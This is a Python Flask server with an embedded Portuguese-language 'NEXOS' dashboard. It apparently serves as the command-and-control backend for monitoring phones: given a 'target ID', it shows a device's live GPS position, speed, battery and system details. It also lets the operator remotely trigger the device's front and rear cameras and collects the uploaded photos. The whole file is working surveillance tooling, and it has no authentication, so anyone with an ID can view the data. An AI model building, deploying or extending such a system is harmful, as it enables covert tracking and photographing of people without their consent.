import os
from flask import Flask, render_template_string, request, jsonify
from datetime import datetime
import logging

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

db_dispositivos = {}

HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXOS CORE // PRODUCTION PANEL</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: #070f15; color: #e2e8f0; font-family: 'Courier New', monospace; padding: 15px; }
        .wrapper { max-width: 900px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 20px; padding: 10px; border-bottom: 2px solid #1e293b; }
        .header h1 { font-size: 20px; color: #38bdf8; letter-spacing: 3px; font-weight: bold; }
        
        .search-box { background: #0d1925; border: 1px solid #1e293b; padding: 20px; border-radius: 12px; text-align: center; margin-bottom: 20px; }
        .search-box input { width: 100%; max-width: 300px; background: #070f15; border: 1px solid #1e293b; padding: 12px; color: #34d399; font-weight: bold; text-align: center; border-radius: 6px; font-size: 16px; margin-bottom: 15px; letter-spacing: 2px; }
        .search-box button { background: #38bdf8; color: #070f15; font-weight: bold; border: none; padding: 12px 30px; border-radius: 6px; cursor: pointer; text-transform: uppercase; font-size: 13px; }
        .search-box button:hover { background: #7dd3fc; }
        
        .device-section { border: 1px solid #1e293b; border-radius: 12px; background: #0d1925; padding: 15px; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.4); }
        .device-title { font-size: 14px; color: #34d399; text-transform: uppercase; border-bottom: 1px solid #1e293b; padding-bottom: 6px; margin-bottom: 12px; display: flex; justify-content: space-between; }
        
        .info-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin-bottom: 12px; }
        @media(max-width: 600px) { .info-grid { grid-template-columns: 1fr 1fr; } }
        
        .info-box { background: #070f15; border: 1px solid #1e293b; padding: 10px; border-radius: 6px; }
        .info-box span { font-size: 10px; color: #64748b; display: block; text-transform: uppercase; margin-bottom: 4px; }
        .info-box strong { font-size: 15px; color: #f1f5f9; }
        
        .map-container { width: 100%; height: 260px; border-radius: 8px; background: #040a0f; border: 1px solid #1e293b; margin-bottom: 15px; }
        .btn-maps { display: block; width: 100%; background: #22c55e; color: #ffffff; text-align: center; padding: 12px; border-radius: 8px; font-weight: bold; text-decoration: none; text-transform: uppercase; font-size: 13px; letter-spacing: 1px; margin-bottom: 15px; }
        .btn-maps:hover { background: #4ade80; }
        
        .btn-camera { display: block; width: 100%; background: #38bdf8; color: #070f15; border: none; text-align: center; padding: 14px; border-radius: 8px; font-weight: bold; text-transform: uppercase; font-size: 13px; letter-spacing: 1px; cursor: pointer; margin-bottom: 20px; }
        .btn-camera:hover { background: #7dd3fc; }
        .btn-camera:disabled { opacity: 0.5; cursor: not-allowed; }
        
        .cameras-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 15px; }
        @media(max-width: 600px) { .cameras-row { grid-template-columns: 1fr; } }
        
        .cam-card { background: #070f15; border: 1px solid #1e293b; border-radius: 8px; overflow: hidden; }
        .cam-card-title { background: #0d1925; padding: 8px; font-size: 11px; color: #64748b; border-bottom: 1px solid #1e293b; font-weight: bold; text-transform: uppercase; }
        .cam-frame { width: 100%; aspect-ratio: 4/3; background: #020609; display: flex; align-items: center; justify-content: center; }
        .cam-frame img { width: 100%; height: 100%; object-fit: cover; display: none; }
        .cam-placeholder { font-size: 11px; color: #334155; text-transform: uppercase; }
        
        .error-box { background: #450a0a; border: 1px solid #991b1b; padding: 15px; border-radius: 8px; text-align: center; margin-bottom: 20px; }
        .error-box p { color: #fca5a5; font-weight: bold; }
        
        .status-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 5px; }
        .status-online { background: #22c55e; box-shadow: 0 0 8px #22c55e; }
        .status-offline { background: #ef4444; }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="header">
            <h1>NEXOS // PRODUCTION PANEL</h1>
        </div>

        <div class="search-box">
            <p>DIGITE O SEU TARGET ID PARA ACESSAR O MONITORAMENTO</p>
            <form id="searchForm" method="POST">
                <input type="text" id="target_id" name="target_id" placeholder="EX: NX-A4B7D1" value="{{ id_buscado if id_buscado else '' }}" required><br>
                <button type="submit">Conectar Sinal</button>
            </form>
        </div>
        
        {% if erro %}
            <div class="error-box">
                <p>⚠️ {{ erro }}</p>
                <p style="font-size: 11px; color: #94a3b8;">Verifique o Target ID e tente novamente</p>
            </div>
        {% endif %}
        
        {% if info_moto %}
            <div class="device-section">
                <div class="device-title">
                    <span><span class="status-dot status-online"></span> CONEXAO ATIVA // {{ id_buscado }}</span>
                    <span style="background: #166534; color: #4ade80; padding: 2px 8px; border-radius: 4px; font-size: 11px;">ONLINE</span>
                </div>
                
                <div class="info-grid">
                    <div class="info-box"><span>🔋 Bateria</span><strong id="txt_bateria" style="color: #22c55e;">{{ info_moto.battery }}%</strong></div>
                    <div class="info-box"><span>⚡ Status Bat.</span><strong id="txt_bat_status">{{ info_moto.get('battery_status', '--') }}</strong></div>
                    <div class="info-box"><span>🌡️ Temp. Bat.</span><strong id="txt_bat_temp">{{ info_moto.get('battery_temp', '--') }}°C</strong></div>
                </div>
                
                <div class="info-grid">
                    <div class="info-box"><span>💾 Armazenamento</span><strong id="txt_storage">{{ info_moto.storage }}</strong></div>
                    <div class="info-box"><span>🧠 RAM</span><strong id="txt_ram">{{ info_moto.get('ram', '--') }}</strong></div>
                    <div class="info-box"><span>⏱️ Uptime</span><strong id="txt_uptime">{{ info_moto.get('uptime', '--') }}</strong></div>
                </div>
                
                <div class="info-grid">
                    <div class="info-box"><span>🚀 Velocidade</span><strong id="txt_speed" style="color: #38bdf8;">{{ info_moto.get('speed', '0 km/h') }}</strong></div>
                    <div class="info-box"><span>📶 Rede</span><strong id="txt_network">{{ info_moto.get('network', '--') }}</strong></div>
                    <div class="info-box"><span>🌡️ Temperatura</span><strong id="txt_temp">{{ info_moto.get('temperature', '--') }}</strong></div>
                </div>
                
                <div id="map_private" class="map-container"></div>
                
                <a id="lnk_maps" href="https://www.google.com/maps?q={{ info_moto.lat }},{{ info_moto.lon }}" target="_blank" class="btn-maps">
                    🗺️ Abrir no Google Maps
                </a>

                <button id="btnCam" class="btn-camera" onclick="dispararCapturaDupla()">📸 Iniciar Captura Sincronizada</button>
                
                <div class="cameras-row">
                    <div class="cam-card">
                        <div class="cam-card-title">🎥 Camera Frontal - Em Tempo Real</div>
                        <div class="cam-frame">
                            <span id="labelFront" class="cam-placeholder">Sem Sinal</span>
                            <img id="imgFront" src="" alt="Frontal">
                        </div>
                    </div>
                    <div class="cam-card">
                        <div class="cam-card-title">🎥 Camera Traseira - Em Tempo Real</div>
                        <div class="cam-frame">
                            <span id="labelBack" class="cam-placeholder">Sem Sinal</span>
                            <img id="imgBack" src="" alt="Traseira">
                        </div>
                    </div>
                </div>
            </div>

            <script>
                let lastValidLat = {{ info_moto.lat }};
                let lastValidLon = {{ info_moto.lon }};
                
                const map = L.map('map_private', { zoomControl: false }).setView([lastValidLat, lastValidLon], 16);
                L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {}).addTo(map);
                let marker = L.marker([lastValidLat, lastValidLon]).addTo(map);

                async function dispararCapturaDupla() {
                    const btn = document.getElementById('btnCam');
                    btn.innerText = "⏳ Sincronizando Lentes...";
                    btn.disabled = true;
                    
                    try {
                        await fetch('/api/comando_camera/{{ id_buscado }}', { 
                            method: 'POST', 
                            body: JSON.stringify({acao: 'take_dual'}), 
                            headers: {'Content-Type': 'application/json'} 
                        });
                        
                        let tentativas = 0;
                        let checagem = setInterval(async () => {
                            try {
                                const res = await fetch('/api/get_camera/{{ id_buscado }}');
                                if (res.ok) {
                                    const data = await res.json();
                                    
                                    if(data.photo_back) {
                                        document.getElementById('labelBack').style.display = "none";
                                        const imgB = document.getElementById('imgBack');
                                        imgB.src = "data:image/jpeg;base64," + data.photo_back;
                                        imgB.style.display = "block";
                                    }
                                    
                                    if(data.photo_front) {
                                        document.getElementById('labelFront').style.display = "none";
                                        const imgF = document.getElementById('imgFront');
                                        imgF.src = "data:image/jpeg;base64," + data.photo_front;
                                        imgF.style.display = "block";
                                    }
                                    
                                    if(data.pronto) {
                                        clearInterval(checagem);
                                        btn.innerText = "📸 Iniciar Captura Sincronizada";
                                        btn.disabled = false;
                                    }
                                }
                                
                                tentativas++;
                                if(tentativas > 20) {
                                    clearInterval(checagem);
                                    btn.innerText = "📸 Iniciar Captura Sincronizada";
                                    btn.disabled = false;
                                    alert("Timeout: As fotos nao chegaram. Verifique o dispositivo.");
                                }
                            } catch(e){
                                console.error("Erro na checagem:", e);
                            }
                        }, 1500);
                        
                    } catch(e) {
                        console.error("Erro ao disparar captura:", e);
                        btn.innerText = "📸 Iniciar Captura Sincronizada";
                        btn.disabled = false;
                    }
                }

                setInterval(async () => {
                    try {
                        const response = await fetch('/api/status/' + '{{ id_buscado }}');
                        if (response.ok) {
                            const data = await response.json();
                            
                            document.getElementById('txt_bateria').innerText = data.battery + '%';
                            document.getElementById('txt_bat_status').innerText = data.battery_status || '--';
                            document.getElementById('txt_bat_temp').innerText = (data.battery_temp || '--') + '°C';
                            document.getElementById('txt_storage').innerText = data.storage || '--';
                            document.getElementById('txt_ram').innerText = data.ram || '--';
                            document.getElementById('txt_uptime').innerText = data.uptime || '--';
                            document.getElementById('txt_speed').innerText = data.speed || '0 km/h';
                            document.getElementById('txt_network').innerText = data.network || '--';
                            document.getElementById('txt_temp').innerText = data.temperature || '--';
                            
                            let tempElement = document.getElementById('txt_temp');
                            let temp = parseFloat(data.temperature);
                            if (temp > 40) tempElement.style.color = '#ef4444';
                            else if (temp > 35) tempElement.style.color = '#f59e0b';
                            else tempElement.style.color = '#22c55e';
                            
                            let nextLat = parseFloat(data.lat);
                            let nextLon = parseFloat(data.lon);
                            if (nextLat && nextLon) {
                                lastValidLat = nextLat;
                                lastValidLon = nextLon;
                                const newPos = [lastValidLat, lastValidLon];
                                marker.setLatLng(newPos);
                                map.panTo(newPos);
                                document.getElementById('lnk_maps').href = 'https://www.google.com/maps?q=' + lastValidLat + ',' + lastValidLon;
                            }
                        }
                    } catch (e) {
                        console.error("Erro ao atualizar status:", e);
                    }
                }, 5000);
            </script>
        {% endif %}
    </div>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    id_buscado = None
    info_moto = None
    erro = None
    
    if request.method == 'POST':
        id_buscado = request.form.get('target_id', '').strip().upper()
        logger.info(f"Buscando dispositivo: {id_buscado}")
        
        if id_buscado in db_dispositivos:
            info_moto = db_dispositivos[id_buscado]
            logger.info(f"Dispositivo encontrado: {id_buscado}")
        else:
            erro = "ID NAO ENCONTRADO NA REDE NEXOS"
            logger.warning(f"Dispositivo nao encontrado: {id_buscado}")
            
    return render_template_string(HTML_DASHBOARD_PRIVADO, id_buscado=id_buscado, info_moto=info_moto, erro=erro)

@app.route('/api/status/<device_id>')
def api_status(device_id):
    device_id = device_id.upper()
    if device_id in db_dispositivos:
        device = db_dispositivos[device_id]
        return jsonify({
            "battery": device.get("battery", "N/A"),
            "battery_status": device.get("battery_status", "N/A"),
            "battery_temp": device.get("battery_temp", "N/A"),
            "storage": device.get("storage", "N/A"),
            "uptime": device.get("uptime", "N/A"),
            "lat": device.get("lat", 0),
            "lon": device.get("lon", 0),
            "speed": device.get("speed", "0 km/h"),
            "temperature": device.get("temperature", "N/A"),
            "network": device.get("network", "N/A"),
            "ram": device.get("ram", "N/A"),
            "timestamp": device.get("timestamp", "")
        }), 200
    return jsonify({"error": "Not found"}), 404

@app.route('/update', methods=['POST'])
def update():
    global db_dispositivos
    data = request.get_json(force=True, silent=True) or {}
    device_id = data.get('device_id', '').upper()
    
    if not device_id: 
        return jsonify({"status": "error", "message": "device_id required"}), 400
    
    if device_id not in db_dispositivos: 
        db_dispositivos[device_id] = {}
        logger.info(f"Novo dispositivo registrado: {device_id}")
    
    db_dispositivos[device_id]["battery"] = data.get("battery", "N/A")
    db_dispositivos[device_id]["battery_status"] = data.get("battery_status", "N/A")
    db_dispositivos[device_id]["battery_temp"] = data.get("battery_temp", "N/A")
    db_dispositivos[device_id]["storage"] = data.get("storage", "N/A")
    db_dispositivos[device_id]["uptime"] = data.get("uptime", "N/A")
    db_dispositivos[device_id]["lat"] = float(data.get("lat", -16.6869))
    db_dispositivos[device_id]["lon"] = float(data.get("lon", -49.2648))
    db_dispositivos[device_id]["speed"] = data.get("speed", "0 km/h")
    db_dispositivos[device_id]["temperature"] = data.get("temperature", "N/A")
    db_dispositivos[device_id]["network"] = data.get("network", "N/A")
    db_dispositivos[device_id]["ram"] = data.get("ram", "N/A")
    db_dispositivos[device_id]["timestamp"] = data.get("timestamp", "")
    db_dispositivos[device_id]["last_seen"] = datetime.utcnow().isoformat()
    
    cmd_cam = db_dispositivos[device_id].get("cmd_cam", "wait")
    db_dispositivos[device_id]["cmd_cam"] = "wait"
    
    logger.info(f"Update recebido de {device_id} - Bat:{data.get('battery')}% - Vel:{data.get('speed')}")
    return jsonify({"status": "success", "comando_cam": cmd_cam}), 200

@app.route('/api/comando_camera/<device_id>', methods=['POST'])
def comando_camera(device_id):
    device_id = device_id.upper()
    data = request.get_json(force=True, silent=True) or {}
    
    if device_id not in db_dispositivos: 
        db_dispositivos[device_id] = {}
    
    acao = data.get("acao", "wait")
    db_dispositivos[device_id]["cmd_cam"] = acao
    db_dispositivos[device_id]["photo_front"] = ""
    db_dispositivos[device_id]["photo_back"] = ""
    
    logger.info(f"Comando de camera enviado para {device_id}: {acao}")
    return jsonify({"status": "ok", "comando": acao}), 200

@app.route('/api/upload_camera', methods=['POST'])
def upload_camera():
    data = request.get_json(force=True, silent=True) or {}
    dev_id = data.get("device_id", '').upper()
    tipo = data.get("tipo")
    foto = data.get("photo", "")
    
    logger.info(f"Recebendo foto {tipo} de {dev_id} - Tamanho: {len(foto)} chars")
    
    if dev_id and dev_id in db_dispositivos:
        if foto:
            db_dispositivos[dev_id][f"photo_{tipo}"] = foto
            logger.info(f"Foto {tipo} armazenada para {dev_id}")
            return jsonify({"status": "stored"}), 200
        else:
            logger.warning(f"Foto {tipo} vazia recebida de {dev_id}")
            return jsonify({"status": "error", "message": "Empty photo"}), 400
    else:
        logger.warning(f"Tentativa de upload para dispositivo inexistente: {dev_id}")
        return jsonify({"status": "error", "message": "Device not found"}), 404

@app.route('/api/get_camera/<device_id>')
def get_camera(device_id):
    device_id = device_id.upper()
    if device_id in db_dispositivos:
        pf = db_dispositivos[device_id].get("photo_front", "")
        pb = db_dispositivos[device_id].get("photo_back", "")
        pronto = True if (pf and pb) else False
        
        logger.info(f"Status fotos {device_id} - Front: {bool(pf)}, Back: {bool(pb)}, Pronto: {pronto}")
        return jsonify({"photo_front": pf, "photo_back": pb, "pronto": pronto}), 200
    
    return jsonify({"photo_front": "", "photo_back": "", "pronto": False}), 404


@app.route('/api/upload_lote', methods=['POST'])
def upload_lote():
    """Recebe as duas fotos em um unico pacote"""
    data = request.get_json(force=True, silent=True) or {}
    dev_id = data.get("device_id", '').upper()
    foto_front = data.get("photo_front", "")
    foto_back = data.get("photo_back", "")
    
    logger.info(f"Recebendo LOTE de fotos de {dev_id}")
    logger.info(f"   Frontal: {len(foto_front)} chars | Traseira: {len(foto_back)} chars")
    
    if dev_id and dev_id in db_dispositivos:
        if foto_front:
            db_dispositivos[dev_id]["photo_front"] = foto_front
            logger.info(f"   ✅ Frontal armazenada")
        if foto_back:
            db_dispositivos[dev_id]["photo_back"] = foto_back
            logger.info(f"   ✅ Traseira armazenada")
        
        return jsonify({
            "status": "stored",
            "front_received": bool(foto_front),
            "back_received": bool(foto_back)
        }), 200
    else:
        logger.warning(f"Dispositivo nao encontrado para lote: {dev_id}")
        return jsonify({"status": "error", "message": "Device not found"}), 404

if __name__ == '__main__':

    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
